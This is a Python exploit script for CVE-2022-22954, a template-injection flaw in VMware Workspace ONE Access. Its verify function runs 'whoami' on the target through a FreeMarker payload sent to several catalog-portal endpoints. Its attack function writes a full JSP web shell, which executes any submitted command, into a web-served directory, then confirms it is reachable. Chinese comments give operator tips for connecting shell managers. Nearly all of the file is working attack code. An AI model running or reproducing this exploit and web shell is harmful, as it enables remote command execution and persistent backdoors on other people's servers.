import urllib
import requests
import re
import random, string


def verify(url):
    relsult = {
        'name': 'VMware Workspace ONE Access SSTI 漏洞(CVE-2022-22954)',
        'vulnerable': False,
        'url': url,
        'attack': True,
        'about': 'https://github.com/bewhale/CVE-2022-22954/blob/main/CVE-2022-22954.py',
    }
    timeout = 5
    cmd = 'whoami'
    poc = '${"freemarker.template.utility.Execute"?new()("' + cmd + '")}'
    headers = {
        "Host": "localhost",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40",
    }
    payloads = {
        "/catalog-portal/ui?code=&deviceType=",
        "/catalog-portal/ui?code=&deviceUdid=",
        "/catalog-portal/hub-ui?deviceType=",
        "/catalog-portal/hub-ui?deviceUdid=",
        "/catalog-portal/hub-ui/byob?deviceType=",
        "/catalog-portal/hub-ui/byob?deviceUdid=",
        "/catalog-portal/ui/oauth/verify?error=&deviceType=",
        "/catalog-portal/ui/oauth/verify?error=&deviceUdid=",
        "/catalog-portal/ui/oauth/verify?code=&deviceType=",
        "/catalog-portal/ui/oauth/verify?code=&deviceUdid=",
    }
    try:
        for payload in payloads:
            try:
                payload = urllib.parse.urljoin(url, payload + poc)
                # output = requests.get(url, headers=headers, verify=False, timeout=15, proxies=proxies)
                output = requests.get(payload, headers=headers, verify=False, timeout=timeout)
                if output.status_code == 400 and ("Authorization context is not valid" in output.text or "Cannot run program" in output.text or "FreeMarker template error" in output.text):
                    relsult['vulnerable'] = True
                    cmd_result = get_results(output.text)
                    if cmd_result:
                        relsult['cmd'] = cmd
                        relsult['verify'] = cmd_result
                    return relsult
                else:
                    continue
            except:
                return relsult
        return relsult
    except:
        return relsult


def get_results(text):
    try:
        # print(text)
        # results = re.search("device id: (.*), device type: (.*), auth token", text)
        result = re.search("device id: (.*), device type", text).group(1)
        if "null" == result:
            if "auth token" in text:
                result = re.search("device type: (.*), auth token", text).group(1)
            else:
                result = re.search("device type: (.*)and token revoke status", text).group(1)
        return result
    except:
        return False

def attack(url):
    timeout = 20
    shell = """
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>"""
    headers = {
        "Host": "localhost",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40",
    }
    payloads = {
        "/catalog-portal/ui?code=&deviceType=",
        "/catalog-portal/ui?code=&deviceUdid=",
        "/catalog-portal/hub-ui?deviceType=",
        "/catalog-portal/hub-ui?deviceUdid=",
        "/catalog-portal/hub-ui/byob?deviceType=",
        "/catalog-portal/hub-ui/byob?deviceUdid=",
        "/catalog-portal/ui/oauth/verify?error=&deviceType=",
        "/catalog-portal/ui/oauth/verify?error=&deviceUdid=",
        "/catalog-portal/ui/oauth/verify?code=&deviceType=",
        "/catalog-portal/ui/oauth/verify?code=&deviceUdid=",
    }
    for payload in payloads:
        filename = ''.join(random.sample(string.digits + string.ascii_letters, 7)) + '.jsp'
        shell = urllib.parse.quote_plus(shell.replace('"', '\\"'))
        if "/" not in filename and "\\" not in filename:
            filename = "/opt/vmware/horizon/workspace/webapps/SAAS/jersey/manager/api/images/2907/" + filename
        exp = '${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileOutputStream","' + filename + '").write("freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","' + shell + '").getBytes())}'
        try:
            payload = urllib.parse.urljoin(url, payload + exp)
            # output = requests.get(url, headers=headers, verify=False, timeout=15, proxies=proxies)
            output = requests.get(payload, headers=headers, verify=False, timeout=timeout)
            url = urllib.parse.urljoin(url, filename[37:])
            print("[+] webshell: " + url + "")
            print("[+] 上传完成，检查是否上传成功...")
            try:
                # resp = requests.get(url, headers=headers, verify=False, timeout=15, proxies=proxies)
                resp = requests.get(url, headers=headers, verify=False, timeout=timeout)
                if resp.status_code == 200:
                    print("[*] 状态码: 200   Webshell:", url)
                    print("[+] 往 catalog-portal 目录发送POST请求时校验了csrf会导致webshell管理工具连接不上，可以尝试写入其他目录")
                    return True
                else:
                    print("[-] 访问失败, 状态码: " + str(resp.status_code) + "")
            except:
                print("[-] 访问失败,请手动进行尝试")
        except:
            return False

